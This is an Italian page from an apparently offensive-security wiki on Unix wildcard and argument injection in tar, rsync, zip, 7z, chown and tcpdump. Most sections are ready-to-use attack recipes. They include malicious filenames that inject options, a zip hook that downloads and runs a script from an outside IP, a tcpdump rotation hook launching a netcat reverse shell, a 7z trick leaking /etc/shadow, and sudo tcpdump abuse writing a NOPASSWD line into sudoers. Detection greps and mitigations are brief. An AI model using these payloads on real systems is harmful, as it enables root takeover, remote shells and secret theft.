# Trucchi extra sui wildcard

{{#include ../../banners/hacktricks-training.md}}

> L’**injection di argomenti tramite wildcard** (alias *glob*) si verifica quando uno script con privilegi esegue un binario Unix come `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard non racchiuso tra virgolette, come `*`.  
> Poiché la shell espande il wildcard **prima** di eseguire il binario, un attacker in grado di creare file nella directory di lavoro può creare nomi di file che iniziano con `-`, facendoli interpretare come **opzioni anziché dati** e riuscendo così a introdurre flag arbitrari o persino comandi.<sup>[[6]](#references)</sup>
> Questa pagina raccoglie le primitive più utili, le ricerche recenti e i metodi di rilevamento moderni per il periodo 2023-2025.

## chown / chmod

Puoi **copiare il proprietario/gruppo o i bit di autorizzazione da un file di riferimento** abusando del flag `--reference` quando un wildcard espande un nome di file che sembra un’opzione.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Quando root esegue in seguito qualcosa come:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Il `--reference=.drf.php` espanso sovrascrive owner/mode espliciti, facendo sì che i file corrispondenti ereditino i metadati di `.drf.php` (e, con la configurazione descritta sopra, risultino scrivibili dall’attaccante).<sup>[[6]](#references)</sup>

Esamina l’intero helper privilegiato, non solo la sua riga `chown`. Una modifica della proprietà può cancellare i bit set-user-ID o set-group-ID; [POSIX lascia il caso privilegiato definito dall’implementazione](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Un successivo `chmod` nello stesso job potrebbe ripristinare quei bit sui file selezionati in precedenza, modificando l’esito. Prima di considerarlo un percorso per ottenere privilegi tramite eseguibili, verifica l’ordine effettivo dei comandi, la directory scrivibile interessata dal glob, il file coinvolto e il comportamento dei link, la proprietà e i permessi risultanti, nonché se il mount supporta set-user-ID. Se l’helper non è leggibile, questi passaggi restano sconosciuti.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (attacco combinato).<sup>[[7]](#references)</sup>
Vedi anche il classico paper di DefenseCode per i dettagli.<sup>[[6]](#references)</sup>

---

## GNU `cp` in uno script privilegiato

Esamina uno script eseguito da root che copia dalla directory di lavoro scelta da chi lo invoca usando un glob senza percorso, ad esempio `cp .version * /etc/app/staged/`, quando un utente con privilegi inferiori può creare nomi di file in quella directory. GNU `cp` può interpretare come opzione un nome di file che inizia con un trattino, espanso da `*`. L’opzione `--preserve=mode` può mantenere i bit di modalità dei sorgenti nella nuova copia, mentre `--target-directory` può modificare la destinazione della copia. Per verificare entrambi gli effetti occorre controllare il ramo esatto dello script, lo stato della destinazione, i privilegi effettivi, le regole del filesystem e il comportamento di GNU `cp`; il solo testo di una regola sudo o di uno script non dimostra un’escalation. Anteporre `./` agli operandi o terminare l’analisi delle opzioni con `--` impedisce a GNU `cp` di interpretare in questo modo i nomi che iniziano con un trattino ([FAQ di GNU Coreutils](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [manuale di `cp`](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Eseguire comandi arbitrari abusando della funzionalità **checkpoint** di GNU tar e delle azioni dei checkpoint.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Una volta che root esegue, ad esempio, `tar -czf /root/backup.tgz *`, `shell.sh` viene eseguito come root.<sup>[[10]](#references)</sup>

### Caveat sull'override del compressore di bsdtar / macOS

Il `tar` predefinito nelle versioni recenti di macOS (basato su `libarchive`) *non* fornisce l'interfaccia `--checkpoint` di GNU tar, ma bsdtar documenta **--use-compress-program** per selezionare un compressore esterno.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Quando uno script con privilegi elevati esegue `tar -cf backup.tar *`, questo seleziona `sh` tramite il `PATH` della vittima e bsdtar lo avvia come compressore.<sup>[[11]](#references)</sup> Questo dimostra l’option injection, ma non costituisce di per sé un metodo affidabile per eseguire comandi arbitrari: un nome di file creato tramite wildcard non può contenere `/` e bsdtar fornisce dati dell’archivio, non un comando shell scelto dall’attaccante. Per ottenere l’esecuzione di codice serve inoltre un eseguibile controllabile, individuato tramite `PATH`, oppure un altro canale di argomenti che possa specificare un programma utile.

---

## rsync

`rsync` consente di sovrascrivere la shell remota o il binario remoto tramite flag della riga di comando come `-e` e `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Se in seguito root archivia la directory con `rsync -az * backup:/srv/`, il flag iniettato può avviare una shell tramite il meccanismo di remote shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modalità `rsync`).

---

## 7-Zip / 7z / 7za

Anche quando lo script privilegiato antepone *difensivamente* `--` al wildcard (per impedire l'analisi delle opzioni), la CLI di 7-Zip accetta **file di elenchi di file** anteponendo `@` al nome del file. Combinando questa funzionalità con un symlink è possibile *esfiltrare file arbitrari*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Se root esegue qualcosa del tipo:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip proverà a leggere `root.txt` (→ `/etc/shadow`) come elenco di file e si fermerà, **stampando il contenuto su stderr**.<sup>[[13]](#references)</sup>

Questo funziona anche con `-- *`, perché la CLI di 7-Zip accetta esplicitamente sia nomi di file normali sia `@listfiles` come input posizionali, quindi un nome di file letterale come `@root.txt` viene comunque trattato in modo speciale.<sup>[[13]](#references)</sup>

---

## zip

Esistono due primitive molto pratiche quando un'applicazione passa a `zip` nomi di file controllati dall'utente (tramite un wildcard o enumerando i nomi senza `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE tramite test hook: `-T` abilita “test archive” e `-TT <cmd>` sostituisce il tester con un programma arbitrario (forma lunga: `--unzip-command <cmd>`). Se puoi iniettare nomi di file che iniziano con `-`, suddividi i flag tra nomi di file distinti affinché l'analisi delle short option funzioni.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Note
- NON provare un singolo nome file come `'-T -TT <cmd>'`: le opzioni brevi vengono analizzate carattere per carattere e il tentativo fallirà. Usa token separati, come mostrato.<sup>[[3]](#references)</sup>
- Se l'app rimuove le barre dai nomi dei file, scarica da un host/IP senza percorso (percorso predefinito `/index.html`) e salva localmente con `-O`, quindi esegui.<sup>[[3]](#references)</sup>
- Puoi eseguire il debug dell'analisi con `-sc` (mostra gli argv elaborati) o `-h2` (ulteriore aiuto) per capire come vengono interpretati i token.<sup>[[3]](#references)</sup>

Esempio (comportamento locale con zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: Se il livello web restituisce stdout/stderr di `zip` (comune con wrapper ingenui), flag iniettati come `--help` o errori dovuti a opzioni errate compariranno nella risposta HTTP, confermando la command-line injection e facilitando la messa a punto del payload.<sup>[[3]](#references)</sup>

---

## Altri possibili vettori di option injection

Quando un wrapper con privilegi espande una directory scrivibile usando un wildcard, vale la pena verificare questi hook documentati per le opzioni.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag da sfruttare | Effetto |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Passa una stringa di comando a una shell |
| `git`   | `-c core.sshCommand=<cmd>` | Usa `<cmd>` al posto di SSH per Git fetch/push |
| `scp`   | `-S <program>` | Usa un programma di connessione alternativo compatibile con SSH |

Queste primitive sono utili da verificare, oltre ai classici *tar/rsync/zip*.

---

## Individuazione di wrapper e job vulnerabili

Recenti casi di studio e indicazioni per il rilevamento mostrano che la wildcard/argv injection non è più solo un problema di **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> La stessa classe di bug continua a comparire in:

- funzionalità web che «scaricano tutto come zip/tar» da directory di upload controllate dagli attaccanti
- shell di debug di appliance/vendor che espongono un wrapper **tcpdump** con campi filename/filter controllati dagli attaccanti
- job di backup o rotazione che eseguono `tar`, `rsync`, `7z`, `zip`, `chown` o `chmod` su directory scrivibili

Comandi utili per il triage (l'invocazione di `pspy` usa i flag documentati per gli eventi di processi/file e per l'intervallo).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Euristiche rapide:

- `-- *` è una buona soluzione per molti strumenti GNU, ma **non** per `7z`/`7za`, perché `@listfiles` vengono analizzati separatamente.<sup>[[13]](#references)</sup>
- Per `zip`, cerca wrapper che enumerano direttamente nomi di file controllati dall'utente; lo short-option splitting (`-T` + `-TT <cmd>`) funziona ancora anche senza una shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Per `tcpdump`, presta particolare attenzione ai wrapper che consentono di controllare **i nomi dei file di output**, **le impostazioni di rotazione** o gli argomenti di **replay dei capture file**.<sup>[[18]](#references)</sup>

---

## Hook di rotazione di tcpdump (-G/-W/-z): RCE tramite argv injection nei wrapper

Quando una shell con restrizioni o un wrapper del vendor crea una command line per `tcpdump` concatenando campi controllati dall'utente (ad es. un parametro "file name") senza quoting/validazione rigorosi, puoi inserire di nascosto flag aggiuntivi di `tcpdump`. La combinazione di `-G` (rotazione basata sul tempo), `-W` (limita il numero di file) e `-z <cmd>` (comando post-rotazione) consente l'esecuzione di comandi arbitrari come l'utente che esegue tcpdump (spesso root sugli appliance).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Prerequisiti:

- Puoi influenzare `argv` passato a `tcpdump` (ad es. tramite un wrapper come `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Il wrapper non sanitizza gli spazi o i token che iniziano con `-` nel campo file name.<sup>[[4]](#references)</sup>

PoC classico (esegue uno script di reverse shell da un percorso scrivibile).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Dettagli:

- `-G 1` ruota ogni secondo e `-W 1` si ferma dopo un file ruotato; la capture deve ricevere un pacchetto corrispondente prima della rotazione.<sup>[[18]](#references)</sup>
- `-z <cmd>` esegue il comando post-rotazione una volta per rotazione e passa come argomento il percorso del savefile chiuso; assicurati che la gestione degli argomenti dello script/interprete corrisponda al tuo payload.<sup>[[18]](#references)</sup>

Varianti senza supporti rimovibili:

- Se hai un altro primitive per scrivere file (ad es. un wrapper di comando separato che consente il reindirizzamento dell'output), inserisci lo script in un percorso noto e attiva `-z /path/script.sh`; se necessario, fai in modo che lo script esegua `/bin/sh` autonomamente.<sup>[[18]](#references)</sup>
- Se un wrapper del vendor consente di scegliere il percorso ruotato, verifica il controllo del percorso solo in combinazione con un comando post-rotazione che interpreta il suo argomento savefile; il solo controllo del percorso non esegue il contenuto del file.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump con wildcard/argomenti aggiuntivi → scrittura/lettura arbitraria e root

Esempio di anti-pattern sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

La regola lascia diverse opzioni disponibili nel parser documentato di tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- Il glob `*` e i pattern permissivi vincolano solo il primo argomento `-w`. `tcpdump` accetta più opzioni `-w`; prevale l'ultima.<sup>[[3]](#references)[[18]](#references)</sup>
- La regola non vincola le altre opzioni, quindi sono consentite `-Z`, `-r`, `-V` ecc.<sup>[[3]](#references)[[18]](#references)</sup>

Le primitive rilevanti sono documentate di seguito.<sup>[[3]](#references)[[18]](#references)</sup>
- Sovrascrivere il percorso di destinazione con un secondo `-w` (il primo serve solo a soddisfare sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal all'interno del primo `-w` per uscire dall'albero vincolato.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Forza la proprietà dell'output con `-Z root` (crea file di proprietà di root ovunque).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Scrittura di contenuti arbitrari riproducendo un PCAP creato ad hoc tramite `-r` (ad es., per aggiungere una riga a sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Crea un PCAP che contenga il payload ASCII esatto e scrivilo come root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Lettura arbitraria di file/leak di segreti con `-V <file>` (interpreta un elenco di file di salvataggio). I messaggi diagnostici di errore spesso ripetono le righe, causando leak di contenuti.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: injection di argomenti in zip per RCE + privilege escalation tramite misconfigurazione di sudo in tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - catena completa di exploit](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Rilevata potenziale shell tramite wildcard injection](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Ritorno al futuro: wildcard Unix fuori controllo (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils - invocazione di `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils - invocazione di `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [checkpoint di GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [manuale di bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [manuale di rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [sintassi della riga di comando di 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [manuale di flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [documentazione sulla configurazione di Git](https://git-scm.com/docs/git-config)
- [17] [manuale di `scp` di OpenBSD](https://man.openbsd.org/scp)
- [18] [manuale di tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
